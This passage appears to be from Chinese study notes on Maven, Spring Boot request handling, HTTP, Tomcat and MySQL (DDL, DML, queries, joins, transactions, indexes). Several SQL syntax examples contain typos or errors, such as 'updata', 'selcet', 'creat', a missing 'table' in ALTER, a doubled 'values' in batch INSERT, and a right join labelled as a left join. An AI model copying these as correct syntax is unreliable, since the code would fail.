groupId,artifactId,version</li></ol></li><li><ol start="4"><li>定义刷新按钮，引入最新加入的坐标<br><a href="http://mvnrepository.com">依赖仓库</a>,每次可以直接在这里找到所需依赖和对应坐标<br>如果引入的依赖不存在，将会连接远程仓库/中央仓库 然后下载依赖</li></ol></li></ul></li></ul></li></ul><pre><code>&lt;!-- 坐标代码示例 --&gt;&lt;dependencies&gt;    &lt;dependency&gt;        &lt;groupId&gt;ch.qos.logback&lt;/groupId&gt;        &lt;artifactId&gt;logback-classic&lt;/artifactId&gt;        &lt;version&gt;1.2.3&lt;/version&gt;    &lt;/dependency&gt;&lt;/dependencies&gt;</code></pre><ul><li><p>依赖传递</p><ul><li>依赖具有传递性<ul><li>直接依赖：在当前项目中通过依赖配置建立的依赖关系</li><li>间接依赖：被依赖的资源如果依赖其它资源，当前项目间接依赖其它资源</li></ul></li><li>可以在maven的项目文件夹中看到依赖项，同时在xml文件中右键选择 Diagrams可以看到依赖的可视化界面</li><li>&lt;exclusions&gt;与<exclusion>可以排除指定依赖</exclusion></li></ul></li><li><p>依赖范围</p><ul><li>依赖的jar包，默认情况下，可以在任何地方使用。可以通过&lt;scope&gt;…&lt;\scope&gt;设置其作用范围：<ul><li>主程序范围有效（main文件夹范围内）</li><li>测试程序范围有效（test文件夹范围内）</li><li>是否参与打包运行（package指令范围内）</li></ul></li></ul></li></ul><table>    <tr>        <th>scope值</th>        <th>主程序</th>        <th>测试程序</th>        <th>打包（运行）</th>        <th>范例</th>    </tr>    <tr>        <td>compile（默认）</td>        <td>Y</td>        <td>Y</td>        <td>Y</td>        <td>lo4g4j</td>    </tr>    <tr>        <td>test</td>        <td>-</td>        <td>Y</td>        <td>-</td>        <td>junit</td>    </tr>    <tr>        <td>provided</td>        <td>Y</td>        <td>Y</td>        <td>-</td>        <td>servlet-api</td>    </tr>    <tr>        <td>runtime</td>        <td>-</td>        <td>Y</td>        <td>Y</td>        <td>jdbc驱动</td>    </tr></table><ul><li>生命周期<ul><li>Maven的生命周期就是为了对所有的Maven项目构建过程进行抽象和统一</li><li>Maven中有三套相互独立的生命周期<ul><li>clean：清理工作</li><li>default：核心工作，如：编译，测试，打包，安装，部署等</li><li>site：生成报告，发布站点</li><li>在同一个生命周期中，当运行后面的阶段时，前面的阶段都会运行</li></ul></li><li>重点掌握5个<ul><li>clean：移除上一次构建生成的文件</li><li>compile：编译项目源代码</li><li>test：使用合适的单元测试框架运行测试（junt）</li><li>package：将编译后的文件打包，如：jar，war</li><li>install：安装项目到本地仓库</li></ul></li><li>执行生命周期的两种方式：<ul><li>在idea中，右侧的maven工具栏，选中对应的生命周期，双击执行</li><li>在命令行中，通过命令执行</li></ul></li></ul></li></ul><h2 id="web-%E5%85%A5%E9%97%A8" tabindex="-1">Web 入门</h2><p><a href="https://www.bilibili.com/video/BV1m84y1w7Tb/?p=58&amp;vd_source=240b8edf72530a8ec2d9f48cc6514072">视频地址</a></p><h3 id="01-springbootweb%E5%85%A5%E9%97%A8" tabindex="-1">01 SpringBootWeb入门</h3><ul><li>需求:<ul><li>使用springboot开发一个web应用，浏览器发起/hello后，给浏览器返回字符串“hello world”</li><li>步骤：<ul><li><ol><li>创建springboot工程，并勾选web开发相关依赖</li></ol></li><li><ol start="2"><li>定义helloController类，添加方法hello，并添加注解</li></ol></li><li><ol start="3"><li>运行测试</li></ol></li></ul></li></ul></li></ul><h3 id="02-http%E5%8D%8F%E8%AE%AE" tabindex="-1">02 HTTP协议</h3><ul><li>HTTP概述<ul><li>概念：Hyper Text Transfer Protocol 超文本传输协议，规定了浏览器和服务器之间的数据传输</li><li>特点：<ul><li><ol><li>基于TCP协议：面向连接，安全</li></ol></li><li><ol start="2"><li>基于请求-响应模型：一次请求对应一次响应</li></ol></li><li><ol start="3"><li>HTTP协议是无状态的协议：对于事务处理没有记忆能力，每次请求和响应都是独立的</li></ol><ul><li>缺点：多次请求之间不能共享数据（可以克服）</li><li>优点：速度快</li></ul></li></ul></li></ul></li><li>HTTP请求协议<ul><li>请求数据格式<ul><li>请求行：请求数据的第一行（请求方式，资源路径，协议）</li><li>请求头：从第二行开始，格式key：value</li><li>请求体：POST请求，存放请求参数<ul><li>请求方式GET：请求参数在请求行中，没有请求体，GET请求大小是有限的</li><li>请求方式POST:请求参数在请求体中，POST请求大小是没有限制的</li></ul></li></ul></li></ul></li><li>HTTP响应协议<ul><li>响应数据格式<ul><li>响应行：响应数据的第一行（协议，状态码，描述）<br>状态码大类</li><li>响应头：第二行开始，格式key：value</li><li>响应体：最后一部分，存放响应数据</li></ul></li></ul></li></ul><table><thead><tr><th>状态码分类</th><th>说明</th></tr></thead><tbody><tr><td>1xx</td><td>响应中–临时状态码，标识请求已经接受，告诉客户端应该继续请求或者如果已完成则忽略</td></tr><tr><td>2xx</td><td>成功–标识请求已经成功被接受，处理已经完成</td></tr><tr><td>3xx</td><td>重定向–重定向到其他地方：他让客户端再发起一个请求以完成整个处理</td></tr><tr><td>4xx</td><td>客户端错误–处理发生错误，责任在客户端，如：客户端请求一个不存在的资源，客户端未被授权，禁止访问等</td></tr><tr><td>5xx</td><td>服务器端错误–处理发生错误，责任在服务端，如：服务端抛出异常，路由错误，HTTP版本不支持等</td></tr></tbody></table><ul><li>HTTP协议解析<ul><li>HTTP协议解析代码将会很复杂，但因为HTTP的广泛使用，且协议的标准型，已经有公司提供出专用的web服务器软件，Tomcat便是一种</li></ul></li></ul><h3 id="03-web%E6%9C%8D%E5%8A%A1%E5%99%A8-tomcat" tabindex="-1">03 Web服务器-Tomcat</h3><p>Web服务器是一个软件程序，对HTTP协议的操作进行封装，使得程序员不必直接对协议操作，让web开发更加便捷。主要功能是“提供网上信息浏览服务”</p><ul><li>简介<ul><li>概念：Tomcat是Apache软件基金会的一个核心项目，是一个开源免费的轻量级Web服务器，支持Servlet/JSP少量JavaEE规范</li><li>JavaEE：Java Enterprise Edition，Java企业版。指Java企业级开发的技术规范的总和</li><li>JavaSE：Java标准版 JavaME：java小型版，多用于嵌入式</li><li>Tomcat也被称为Web容器，Servlet容器。Servlet程序需要依赖于Tomcat才能运行</li><li><a href="https://tomcat.apache.org">官网</a></li></ul></li><li>基本使用:发现本地使用不了，寄</li><li>入门程序解析：<ul><li>起步依赖,原理是maven依赖传递<ul><li>spring-boot-stater-web</li><li>spring-boot-stater-test</li></ul></li><li>内嵌tomcat服务器：springboot自带tomcat作为服务器，tomcat白雪，不用运行</li></ul></li></ul><h2 id="%E8%AF%B7%E6%B1%82%E5%93%8D%E5%BA%94" tabindex="-1">请求响应</h2><p><a href="https://www.bilibili.com/video/BV1m84y1w7Tb/?p=67&amp;vd_source=240b8edf72530a8ec2d9f48cc6514072">视频连接</a></p><ul><li>前端控制器 DispatchServlet，提供了两个对象<ul><li>请求对象 HttpServletRequest : 获取请求程序</li><li>响应对象 HttpServletResponse : 设置响应数据</li></ul></li><li>BS架构： Browser/Server，浏览器/服务器架构。客户端只需要浏览器，应用程序和逻辑都存储在服务器端(维护方便，体验一般)</li><li>CS架构： Client/Server，客户端/服务器模式 （开发，维护麻烦，但体验不错）</li></ul><h3 id="01-%E8%AF%B7%E6%B1%82" tabindex="-1">01 请求</h3><ul><li><p>当前最主流开发模式：前后端分离，原型+需求决定接口文档，前后端依据接口文档进行开发</p></li><li><p>postman的使用：</p><ul><li>postman是一款功能强大的网页调试与发送网页http请求的chrome插件，常用于接口测试</li></ul></li><li><p>简单参数</p><ul><li>原始方式：在原始的web程序中，获取请求参数，需要通过HttpServletRequest对象手动获取。但这种方法繁琐，需要手动转换类型</li></ul><pre><code class="language-java">@RequestMapping(&quot;/simpleParam&quot;)  public String simpleParam(HttpServletRequest request)&#123;      String name=request.getParameter(&quot;name&quot;);      String ageStr=request.getParameter(&quot;age&quot;);      int age = Integer.parseInt(ageStr);      System.out.println(name+&quot;:&quot;+age);      return &quot;OK&quot;;  &#125;</code></pre><ul><li>springboot方式：只要参数名和形参变量名相同，定义形参即可接受参数</li></ul><pre><code class="language-java">@RequestMapping(&quot;/simpleParam&quot;)  public String simpleParam(String name,Integer age)&#123;      System.out.println(name+&quot;:&quot;+age);      return &quot;OK&quot;;  &#125;</code></pre><ul><li>springboot方式中，如果方法形参名称与请求参数名称不匹配，可以使用<code>@RequestParam</code>进行映射。<ul><li><code>@RequestParam</code>中的<code>required</code>属性值默认为true，代表该参数必须传递，不传递将会报错。如果该参数是可选的，可以将<code>required</code>值设置为false</li></ul></li></ul><pre><code class="language-java">  @RequestMapping(&quot;/simpleParam&quot;)  public String simpleParam(@RequestParam(name=&quot;name&quot;) String username, Integer age)&#123;      System.out.println(username+&quot;:&quot;+age);      return &quot;OK&quot;;  &#125;</code></pre></li><li><p>实体参数</p><ul><li>简单实体参数：请求参数名和形参对象属性名相同，定义POJO接受即可</li><li>复杂实体参数：即实体的嵌套，请求参数名和形参对象属性名相同，按照对象层次结构关系即可接受嵌套POJO属性参数</li></ul><pre><code class="language-java">//http://localhost:8080/simplePojo?name=Tom&amp;age=10&amp;address.province=陕西&amp;address.city=西安public class User &#123;  private String name;  private Integer age;  private address Address;&#125;public class address &#123;  private String province;  private String city;&#125;</code></pre></li><li><p>数组集合参数</p><ul><li>数组参数：请求参数名与形参数组名称相同且请求参数为多个，定义数组类型形参即可接受参数</li></ul><pre><code class="language-java">//http://localhost:8080/arrayParam?hobby=game&amp;hobby=java&amp;hobby=sing@RequestMapping(&quot;/arrayParam&quot;)  public String arrayParam(String[] hobby)&#123;      System.out.println(Arrays.toString(hobby));      return &quot;OK&quot;;  &#125;</code></pre><ul><li>集合参数：请求参数名与形参数组名称相同，通过@RequestParam绑定参数关系</li></ul><pre><code class="language-java">//http://localhost:8080/listParam?hobby=game&amp;hobby=java&amp;hobby=sing@RequestMapping(&quot;/listParam&quot;)  public String arrayParam(@RequestParam List&lt;String&gt; hobby)&#123;      System.out.println(hobby);      return &quot;OK&quot;;  &#125;</code></pre></li><li><p>日期参数：</p><ul><li>使用<code>@DateTimeFormat</code>注解完成日期参数格式转换</li></ul><pre><code class="language-java">  //http://localhost:8080/dateParam?updateTime=2023-03-25 15:40:00  @RequestMapping(&quot;/dateParam&quot;)  public String dataParam(@DateTimeFormat(pattern = &quot;yyyy-MM-dd HH:mm:ss&quot;)LocalDateTime updateTime)&#123;      System.out.println(updateTime);      return &quot;OK&quot;;  &#125;</code></pre></li><li><p>JSON参数</p><ul><li>json数据键名与形参对象属性名相同，定义POJO类型形参即可接收参数，需要使用<code>RequestBody</code>标识</li></ul><pre><code class="language-java">//http://localhost:8080/jsonParam@RequestMapping(&quot;/jsonParam&quot;)  public String jsonParam(@RequestBody User user)&#123;      System.out.println(user);      return &quot;OK&quot;;  &#125;</code></pre></li><li><p>路径参数</p><ul><li>通过请求url直接传递参数，使用{…}来标识路径参数，需要使用<code>@PathVariable</code>获取路径参数</li></ul><pre><code class="language-java">//http://localhost:8080/path/10@RequestMapping(&quot;/path/&#123;id&#125;&quot;)  public String pathParam(@PathVariable Integer id)&#123;      System.out.println(id);      return &quot;OK&quot;;  &#125;//传递两个参数//http://localhost:8080/path/10/Tom@RequestMapping(&quot;/path/&#123;id&#125;/&#123;name&#125;&quot;)  public String path2Param(@PathVariable Integer id,@PathVariable String name)&#123;      System.out.println(id+&quot;:&quot;+name);      return &quot;OK&quot;;  &#125;</code></pre></li></ul><h3 id="02-%E5%93%8D%E5%BA%94" tabindex="-1">02 响应</h3><ul><li>响应数据使用<code>@ResponseBody</code>注解<ul><li>类型：方法注解，类注解</li><li>位置：Controller方法/类上</li><li>作用：将方法返回值直接响应，如果返回值类型是实体对象/集合，将会转换为JSON格式</li><li>说明：<code>@RestController=@Controller+@ResponseBody</code></li></ul></li><li>使用同一响应结果，方便项目管理和维护，如设置一个result类，所有返回结果均为result类</li><li><code>Result(code,msg,data)</code></li></ul><h3 id="03-%E8%AF%B7%E6%B1%82%E5%92%8C%E5%93%8D%E5%BA%94%E7%BB%BC%E5%90%88%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90" tabindex="-1">03 请求和响应综合案例分析</h3><p><a href="https://www.bilibili.com/video/BV1m84y1w7Tb/?p=74&amp;vd_source=240b8edf72530a8ec2d9f48cc6514072">视频连接</a></p><p>前端和后端的组合小案例</p><h3 id="04-%E5%88%86%E5%B1%82%E8%A7%A3%E8%80%A6" tabindex="-1">04 分层解耦</h3><ul><li><p>三层架构</p><ul><li>controller:控制层，接收前端发送的请求，对请求进行处理，并响应数据</li><li>service：业务逻辑层，处理具体的业务逻辑</li><li>dao：数据访问层（Data Access Object）（持久层），负责数据访问操作，包括数据的增删改查</li><li>三层架构 复用性强，便于维护，利于拓展</li></ul></li><li><p>分层解耦</p><ul><li>内聚：软件中各个功能模块内部的功能联系</li><li>耦合：衡量软件中各个层/模块之间的依赖和关联程度</li><li>软件设计原则：高内聚低耦合</li><li></li></ul></li><li><p>IoC (Inversion of Control) 控制反转</p><ul><li>使用对象时，由主动new产生对象转换为由外部提供对象，此过程中对像创建控制权由程序转移到外部，此思想称为控制反转</li><li>Spring技术对IoC技术进行了实现<ul><li>Spring提供了一个容器，称为IoC容器，用来充当IoC思想中的“外部”</li><li>IoC容器负责对象的创建，初始化等一系列工作，被创建或被管理的对象再IoC容器里称为<code>Bean</code></li></ul></li></ul></li><li><p>DI (Dependency Injection) 依赖注入</p><ul><li>在容器中简历bean和bean之间的依赖关系的整个过程，称为依赖注入</li></ul></li><li><p>IOC与DI入门程序</p><ul><li>在类前加<code>@Component</code>表示将当前类交给IOC容器管理，称为IOC容器里的bean。该操作实现控制反转</li><li>在对象前加<code>@Autowired</code>表示在运行时，IOC容器会提供该类型的bean对象，并赋值给该变量。该操作实现依赖注入。</li></ul></li><li><p>IOC详解</p><ul><li>Bean的声明：要把某个对象交给IOC容器管理，需要在对应的类上加上如下注解之一：</li></ul><table><thead><tr><th>注解</th><th>说明</th><th>位置</th></tr></thead><tbody><tr><td>@Component</td><td>声明bean的基础解释</td><td>不属于以下三类时，用此注解</td></tr><tr><td>@Controller</td><td>@Component的衍生注解</td><td>标注在控制器类上</td></tr><tr><td>@Service</td><td>@Component的衍生注解</td><td>标注在业务类上</td></tr><tr><td>@Repository</td><td>@Component的衍生注解</td><td>标注在数据访问类上（由于与mybatis整合，用的很少）</td></tr></tbody></table><ul><li>注意事项：<ul><li>声明bean时，可以通过value属性指定bean的名字，如果没有指定，默认为类名首字母小写</li><li>使用以上四个注解都可以声明bean，但是在springboot集成web开发中，声明控制器bean只能用<code>@Controller</code></li></ul></li><li>Bean的组件扫描<ul><li>前面声明的bean的四大注解，想要生效，还需要被组件扫描注解<code>@ComponentScan</code>扫描</li><li><code>@ComponentScan</code>注解虽然没有显式配置，但是实际上已经包含在了启动类声明注解<code>@SpringBootApplication</code>中，默认扫描范围时启动类所在包及其子包</li><li>可以手动设置扫描范围以覆盖默认扫描范围，但推荐还是把项目中的所有bean都放在启动类中</li></ul></li></ul></li><li><p>DI详解</p><ul><li><code>@Autowired</code>：默认安装类型自动装配</li><li>如果同类型的bean存在多个<ul><li><code>@Primary</code>：放到bean的注解前，用来指定优先级</li><li><code>@AutoWired+@qualifier(&quot;bean的名称&quot;)</code>根据名称选择</li><li><code>@Resource(name=&quot;bean的名称&quot;)</code>根据名称选择</li></ul></li><li><code>@AutoWired</code>和<code>@Resource</code>的区别<ul><li><code>@Resource</code>是JDK提供的注解,<code>@AutoWired</code>是spring框架提供的注解</li><li><code>@AutoWired</code>默认按照类型进行注入,<code>@Resource</code>默认按照名称进行注入</li></ul></li></ul></li></ul><h2 id="mysql" tabindex="-1">MySQL</h2><p><a href="https://www.bilibili.com/video/BV1m84y1w7Tb/?p=80&amp;vd_source=240b8edf72530a8ec2d9f48cc6514072">视频地址</a></p><p>以下内容可分为三个部分</p><ul><li>数据库设计<ul><li>MySQL概述</li><li>数据库设计-DDL</li><li>多表设计</li></ul></li><li>数据库操作<ul><li>数据库操作-DML</li><li>数据库操作-DQL</li><li>事务</li><li>查询</li></ul></li><li>数据库优化<ul><li>索引</li><li>SQL优化</li></ul></li></ul><h3 id="01-mysql%E6%A6%82%E8%BF%B0" tabindex="-1">01 MySQL概述</h3><ul><li><p>安装社区版MySQL，<a href="https://dev.mysql.com/downloads/mysql/">官网</a><br>安装步骤视频讲的很细</p></li><li><p>MySQL连接：<code>mysql -u用户名 -p 密码 [-h数据库服务器IP地址 -P端口号]</code></p></li><li><p>MySQL-企业开发使用方式</p><ul><li>远程使用服务器</li></ul></li><li><p>MySQL数据库模型</p><ul><li>关系型数据库（RDBMS）：建立在关系模型基础上，由多张相互连接的二维表组成的数据库</li><li>特点：<ul><li>使用表存储数据，格式统一，便于维护</li><li>使用SQL语言操作，标准统一，使用方便，可用于复杂查询</li></ul></li></ul></li><li><p>SQL简介</p><ul><li>SQL：一门操作关系型数据库的编程语言，定义操作所有关系型数据库的统一标准</li><li>通用语法：<ul><li>SQL语句可以单行或者多行书写，以分号结尾</li><li>SQL语句可以使用空格或缩进来增强语句可读性</li><li>MYSQL数据库的SQL语句不区分大小写</li><li>注释<ul><li><ol><li>单行注释：<code>-- 注释内容</code> 或 <code># 注释内容</code>(MySQL特有)</li></ol></li><li><ol start="2"><li>多行注释：<code>/*注释内容*/</code></li></ol></li></ul></li></ul></li><li>SQL分类<ul><li>SQL语句通常分为四类</li></ul></li></ul><table><thead><tr><th>分类</th><th>全称</th><th>说明</th></tr></thead><tbody><tr><td>DDL</td><td>Data Definition Language</td><td>数据定义语言，用来定义数据库对象（数据库与，表，字段）</td></tr><tr><td>DML</td><td>Data Manipulation Language</td><td>数据操作语言，用来对数据库表中的数据进行增删改</td></tr><tr><td>DQL</td><td>Data Query Language</td><td>数据查询语言，用来查询数据库表中的数据</td></tr><tr><td>DCL</td><td>Data Control Language</td><td>数据控制语言，用来创建数据库用户，控制数据库的访问权限</td></tr></tbody></table></li></ul><h3 id="02-%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%BE%E8%AE%A1-ddl" tabindex="-1">02 数据库设计-DDL</h3><ul><li><p>DDL 数据库操作</p><ul><li>查询：<ul><li>查询所有数据库：<code>show databases</code></li><li>查询当前数据库：<code>select database()</code></li></ul></li><li>使用<ul><li>使用数据库：<code>use 数据库名</code></li></ul></li><li>创建<ul><li>创建数据库：<code>create database [if not exist] 数据库名</code></li></ul></li><li>删除<ul><li>删除数据库：<code>drop database [if exists] 数据库名</code></li></ul></li></ul></li><li><p>用命令行使用mysql语句的缺点</p><ul><li>无提示，操作繁琐，无历史记录</li><li>因此可以使用mysql的可视化工具，有<ul><li>SQLyog，Navicat，DataGrip</li></ul></li><li>这里使用DataGrip，其为Jetbrains旗下的一款数据库管理工具，是管理和开发MySQL，Oracle，PostgreSQL的理想解决方案</li><li>DataGrip为IDEA自带，（IDEA贵有贵的道理）</li></ul></li><li><p>DDL表（创建，查询，修改，删除）</p></li><li><p>创建</p><pre><code class="language-SQL">create table 表名(  字段1 字段类型 [约束][comment 字段1注释]  ...  字段n 字段类型 [约束][comment 字段n注释])[comment 表注释]</code></pre><ul><li><p>约束</p><ul><li>概念：约束是作用表中字段上的规则，用于限制存储在表中的数据</li><li>目的：保证数据库中数据的正确性，有效性，完整性</li><li>SQL语句主要提供以下5种约束</li></ul><table><thead><tr><th>约束</th><th>描述</th><th>关键字</th></tr></thead><tbody><tr><td>非空约束</td><td>限制该字段值不能为null</td><td>not null</td></tr><tr><td>唯一约束</td><td>保证字段的所有数据都是唯一，不重复的</td><td>unique</td></tr><tr><td>主键约束</td><td>主键是一行数据的唯一标识，要求非空且唯一</td><td>primary key (auto_increment 设置自动增长)</td></tr><tr><td>默认约束</td><td>保存数据时，如果未指定该字段，则使用默认值</td><td>default</td></tr><tr><td>外键约束</td><td>让两张表的数据建立连接，保证数据的一致性和完整性</td><td>foreign key</td></tr></tbody></table></li><li><p>数据类型：主要分为三类</p><ul><li>数值类型：主要使用 tinyint,int,float,double</li><li>字符串类型:char(定长字符，性能高)，varchar(边长字符，性能低但占空间少)</li><li>日期时间类型</li></ul></li><li><p>表结构设计基本流程</p><ul><li>页面原型+需求 -&gt; 原型字段(类型，约束) + 基础字段（创建时间，上一次更改时间）-&gt; 得到需要的表</li></ul></li></ul></li><li><p>查询</p><ul><li>查询当前数据库的所有表：<code>show tables</code></li><li>查询表结构：<code>desc 表名</code></li><li>查询建表语句：<code>show create table 表名</code></li></ul></li><li><p>修改</p><ul><li>添加字段：<code>alter 表名 add 字段名 类型(长度) [comment 注释][约束]</code></li><li>修改字段类型：<code>alter table 表名 modify 字段名 新数据类型(长度)</code></li><li>修改字段名和字段类型：<code>alter table 表名 change 旧字段名 新字段名(长度)[comment 注释][约束]</code></li><li>删除字段：<code>alter table 表名 drop column 字段名</code></li><li>修改表明：<code>rename table 表名 to 新表名</code></li></ul></li><li><p>删除</p><ul><li>删除表： <code>drop table [if exists] 表名</code></li><li>在删除表的首，表中的数据也会删除</li></ul></li></ul><h3 id="03-%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%BE%E8%AE%A1-dml" tabindex="-1">03 数据库设计-DML</h3><p>DML（Data Manipulation Language） 数据操作语言，用来对数据库表中的数据进行增删改操作</p><ul><li><p>insert 插入</p><ul><li>语法<ul><li>指定字段添加数据：<code>insert 表名 (字段名1，字段名2) values (值1，值2)</code></li><li>全部字段添加数据：<code>insert 表名 values(值1，值2)</code></li><li>批量添加数据（指定字段）<code>insert 表名 (字段名1，字段名2) values (值1，值2),values (值1，值2)</code></li><li>鼻梁添加数据（全部字段）<code>insert 表名 values(值1，值2),values(值1，值2)</code></li></ul></li><li>注意事项<ul><li><ol><li>插入数据时，指定的字段顺序需要和值的顺序是一一对应的</li></ol></li><li><ol start="2"><li>字符串和日期类型数据应该包含在引号里</li></ol></li><li><ol start="3"><li>插入的数据大小，应该在字段的规定范围内</li></ol></li></ul></li></ul></li><li><p>update 更新</p><ul><li>语法<ul><li>修改数据：<code>updata 表名 set 字段值1=值1,字段值2=值2,...[where 条件]</code></li></ul></li><li>注意事项<ul><li>修改语句的条件可有可无，如无，则会修改整张表</li></ul></li></ul></li><li><p>delete 删除</p><ul><li>语法<ul><li>删除数据:<code>delete from 表名 [where 条件]</code></li></ul></li><li>注意事项<ul><li><ol><li>DELETE语句的条件可有可无，若没有则会删除整张表</li></ol></li><li><ol start="2"><li>DELETE语句不能删除某一个字段的值(如果操作，可以使用UPDATE，将该字段值置为NULL)</li></ol></li></ul></li></ul></li></ul><h3 id="04-%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%BE%E8%AE%A1-dql" tabindex="-1">04 数据库设计-DQL</h3><ul><li><p>DQL（Data Query Language）（数据查询语言），用来查询数据库表中的数据</p></li><li><p>关键词 SELECT</p><ul><li>语法：<br><img src="/images/web/%E5%88%9D%E5%85%A5%E5%90%8E%E7%AB%AF/DQL0.jpg" alt="DQL语法"></li></ul></li><li><p>基本查询</p><ul><li>查询多个字段：<code>selcet 字段1,字段2,字段3 from 表名</code></li><li>查询所有字段（通配符）：<code>select * from 表名</code>(该方法不直观，且效率低)</li><li>设置别名：<code>select 字段1 [as 别名1], 字段2 [as 别名2] from 表名</code></li><li>去除重复记录：<code>select distinct 字段列表 from 表名</code></li></ul></li><li><p>条件查询</p><ul><li>语法：<code>select 字段列表 from 表名 where 条件列表</code></li><li>比较运算符：<code>&gt;,&gt;=,&lt;,&lt;=,=,&lt;&gt;或!=(不等于),between ... and ..., in(...),like (字符串和占位符),is null </code></li><li>逻辑运算符：<code>and或&amp;&amp;,or或||,not或!</code></li></ul></li><li><p>分组查询</p><ul><li>聚合函数<ul><li>介绍：将一列数据作为一个整体，并进行纵向计算</li><li>语法：<code>select 聚合函数(字段列表) from 表名</code></li><li>常见聚合函数<code>count,max,min,avg,sum</code></li><li>注意事项：null不参与聚合函数</li></ul></li><li>语法：<ul><li>分组查询：<code>select 字段列表 from 表名 [where 条件]  group 分组字段名 [having 分组过滤后的条件]</code></li></ul></li><li>where和having区别<ul><li><ol><li>执行时机不同：where是分组之前进行过滤，不满足where条件，不参与分组；而having是分组之后对结果进行过滤</li></ol></li><li><ol start="2"><li>判断条件不同：where不能对聚合函数进行判断，而having可以</li></ol></li></ul></li><li>注意事项：<ul><li>分组后，查询的字段为分组字段和聚合函数，查询其它字段无意义</li><li>执行顺序：where&gt;聚合函数&gt;having</li></ul></li></ul></li><li><p>排序查询</p><ul><li>语法：<ul><li>条件查询：<code>select 字段列表 from 表名 [where 条件列表][group by 分组字段] order by 字段1 排序方式1, 字段2 排序方式2...;</code></li></ul></li><li>排序方式<ul><li><code>ASC</code>升序（默认值），<code>DESC</code>降序</li></ul></li></ul></li><li><p>分页查询</p><ul><li>语法：<code>select 字段列表 from 表名 limit 起始索引,查询记录数</code></li><li>注意事项：<ul><li><ol><li>起始索引从0开始，起始索引=(查询页码-1)*每页显示记录数</li></ol></li><li><ol start="2"><li>分页查询是数据库的方言，不同数据库实现不同</li></ol></li><li><ol start="3"><li>如果查询的数据是第一页的数据，起始索引可以省略</li></ol></li></ul></li></ul></li><li><p>函数</p><ul><li><code>if(表达式,tvalue,fvalue)</code>:当表达式为true时，取tvalue，否则取fvalue</li><li><code>case expr when value1 then result1 [when value2 then result2..][else result] end</code> 类似switch语句</li></ul></li></ul><h3 id="05-%E5%A4%9A%E8%A1%A8%E8%AE%BE%E8%AE%A1" tabindex="-1">05 多表设计</h3><ul><li><p>一对多</p><ul><li>使用外键约束，保证数据的一致性和完整性</li><li>外键语法：</li></ul><pre><code class="language-sql"># 创建时添加外键create table 表名(  字段民 数据类型,  ...  [constraint] [外键名称] foreign key (外键字段名) references 主表 (字段名));# 创建后添加外键alter table 表名 add constraint 外键名称 foreign key (外键字段名) references 主表(字段名) </code></pre><ul><li>物理外键<ul><li>概念：使用<code>foreign key</code>定义外键关联另一张表</li><li>缺点：<ul><li>影响增删改的效率（需要查外键关系）</li><li>仅用于单节点数据库，不适用于分布式，集群场景</li><li>容易引发数据库的死锁问题，消耗性能</li></ul></li><li>引起缺点在企业中已经很少使用，甚至明文禁止</li></ul></li><li>逻辑外键<ul><li>概念：在业务层逻辑，解决外键连接</li><li>通过逻辑外键，可以很方便解决</li></ul></li></ul></li><li><p>一对一</p><ul><li>关系：一对一关系，多用于单表拆分，将一张表的基础字段放在一张表中，其它字段放在另一张表中，以提升效率</li><li>实现：在任意一方加入外键，关联另一方的主键，并且设置外键为唯一的。</li></ul></li><li><p>多对多</p><ul><li>关系：一个学生可以选多个课程，一个课程可供多个学生选择</li><li>实现：建立第三张表，中间表至少包含两个外键，分别关联两方主键</li></ul></li></ul><h3 id="06-%E5%A4%9A%E8%A1%A8%E6%9F%A5%E8%AF%A2" tabindex="-1">06 多表查询</h3><ul><li><p>概念：从多个表中查询数据</p><ul><li>笛卡尔积</li><li>内连接</li><li>外连接<ul><li>左外连接：查询左表所有数据（包括两张表交集部分数据）</li><li>右外连接：查询右表所有数据（包括两张表交集部分数据）</li></ul></li><li>子查询</li></ul></li><li><p>内连接</p><ul><li>语法<ul><li>隐式内连接：<code>select 字段列表 from 表1,表2 where 条件 ...;</code></li><li>显式内连接：<code>select 字段列表 from 表1 [inner] join 表2 on 条件;</code></li></ul></li></ul></li><li><p>左外连接：<code>select 字段列表 from 表1 left [outer] join 表2 on 连接条件</code></p></li><li><p>左外连接：<code>select 字段列表 from 表1 right [outer] join 表2 on 连接条件</code></p></li><li><p>子查询</p><ul><li>介绍：SQL语句种嵌套select语句，称为嵌套查询，又称子查询</li><li>形式：<code>select * from t1 where column1 = (select column1 from t2 ..)</code></li><li>子查询外部的语句可以是insert/update/delete/select的任何一个，最常见的是select</li><li>分类<ul><li>标量子查询，列子查询，行子查询，表子查询</li></ul></li></ul></li></ul><h3 id="07-%E4%BA%8B%E5%8A%A1" tabindex="-1">07 事务</h3><ul><li>介绍<ul><li>概念：事务是一组操作集合，他是一个不可分割的工作单位。事务会把所有的操作作为一个整体一起向系统提交或撤销操作请求，即这些操作要么同时成功，要么同时失败</li><li>注意事项：默认MySQL的事务是自动提交的，即当执行依据DML语句，MySQL会立即隐式地提交事务</li></ul></li><li>事务控制<ul><li>开启事务：<code>start transaction; / begin</code></li><li>提交事务：<code>commit</code></li><li>回归事务：<code>rollback</code></li></ul></li><li>事务四大特性<ul><li>原子性Atomicity  ：事务是不可分割的最小单位，要么全部成功，要么全部失败</li><li>一致性Consistency：事务完成时，必须使所有的数据都保持一致性</li><li>隔离性Isolation  ：数据库系统提供的隔离机制，保证事务在不受外部并发操作影响的独立环境下运行</li><li>持久性Durability ：事务一旦提交或回滚，它对数据库中的数据的改变就是永久的。</li></ul></li></ul><h3 id="08-%E7%B4%A2%E5%BC%95" tabindex="-1">08 索引</h3><ul><li><p>概念：帮助数据库高效获取数据的数据结构</p></li><li><p>优点：</p><ul><li>提高数据查询效率，降低数据库IO成本</li><li>通过索引列对数据进行排序，降低数据排序成本，降低CPU消耗</li></ul></li><li><p>缺点</p><ul><li>索引会占据存储空间</li><li>索引大大提高了查询效率，但降低了增删改的效率</li><li>然而缺点影响不大，当今企业存储空间已经不是问题，且一个正常的数据库系统90%是查询操作</li></ul></li><li><p>结构</p><ul><li>MySQL数据库支持的索引结构很多，如：hash索引，B+Tree索引，Full-Text索引等。但MySQL默认索引为B+Tree结果组织的索引。</li></ul></li><li><p>语法</p><ul><li>创建索引：<code>creat [unique] index 索引名 on 表名(字段名)</code></li><li>查看索引：<code>show index from 表名</code></li><li>删除索引：<code>drop index 索引名 on 表名</code></li></ul></li><li><p>注意事项：</p><ul><li>主键字段，在建表时，会自动创建主键索引</li><li>添加唯一约束时，数据库实际上会添加唯一索引</li></ul></li></ul><h2 id="mybaits" 